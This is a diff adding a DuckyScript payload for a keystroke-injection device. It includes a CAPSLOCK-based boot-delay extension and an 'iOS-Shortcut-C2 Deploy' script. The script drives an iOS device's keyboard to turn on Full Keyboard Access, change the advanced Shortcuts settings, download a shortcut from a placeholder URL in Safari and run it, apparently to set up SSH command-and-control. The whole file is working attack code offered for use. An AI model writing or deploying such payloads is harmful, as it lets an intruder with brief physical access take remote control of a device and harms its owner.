@@ -1,0 +1,128 @@
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+REM_BLOCK  
+# Title: iOS-Shortcut-C2 Deploy
+# Author: Hak5Peaks
+# Description: Used to quickly configure iOS devices for SSH Shortcut.
+# Project github.com/hak5peaks/iOS-Shortcuts-C2
+END_REM
+
+DEFINE #SHORTCUT_URL shortcuts://shortcuts/(PLACE YOUR SHORTCUT ID HERE)
+DEFINE #SHORTCUT_NAME
+DEFINE #FULL_KEYBOARD_ACCESS_DELAY 10000 
+
+FUNCTION SET_SETTINGS()
+GUI h
+DELAY 1000
+GUI SPACE
+DELAY 1500
+STRINGLN Settings
+DELAY 2000
+STRINGLN Full Keyboard Access
+DELAY #FULL_KEYBOARD_ACCESS_DELAY
+REM Giving user 10 seconds to click into Full keyboard access -> On
+
+REM navigate to Shortcuts Advanced Settings
+GUI [
+DELAY 400
+REPEAT 3 TAB
+DELAY 250
+SPACE
+DELAY 250
+GUI a
+DELAY 100
+BACKSPACE
+DELAY 250
+REM navigating to legal page to easily navigate to advanced
+STRINGLN Legal N
+DELAY 250
+DOWNARROW
+DELAY 250
+SPACE
+DELAY 1000
+SPACE
+DELAY 250
+REPEAT 4 DOWNARROW
+DELAY 100
+SPACE
+DELAY 500
+SPACE
+END_FUNCTION
+
+
+FUNCTION SAFARI_DOWNLOAD()
+GUI SPACE
+DELAY 250
+BACKSPACE
+STRINGLN Safari
+REM this assumes safari is not in private browsing
+DELAY 2000
+GUI n
+DELAY 500
+GUI l
+DELAY 250
+STRINGLN #SHORTCUT_URL
+DELAY 500
+UP
+RIGHT
+DELAY 250
+SPACE
+DELAY 2500
+REPEAT 3 DOWN
+SPACE
+END_FUNCTION
+
+FUNCTION RUN_SHORTCUT()
+GUI SPACE
+DELAY 250
+STRINGLN Safari
+DELAY 750
+GUI n
+DELAY 250
+GUI l
+DELAY 250
+STRINGLN shortcuts://run-shortcut?name=#SHORTCUT_NAME
+DELAY 4000
+REM Wait for the shortcut app to load and fetch shortcut file.
+ENTER
+DELAY 100
+UP
+DELAY 100
+RIGHT
+DELAY 250
+SPACE
+DELAY 750
+REPEAT 3 DOWN
+DELAY 250
+SPACE
+END_FUNCTION
+
+SET_SETTINGS()
+SAFARI_DOWNLOAD()
+RUN_SHORTCUT()
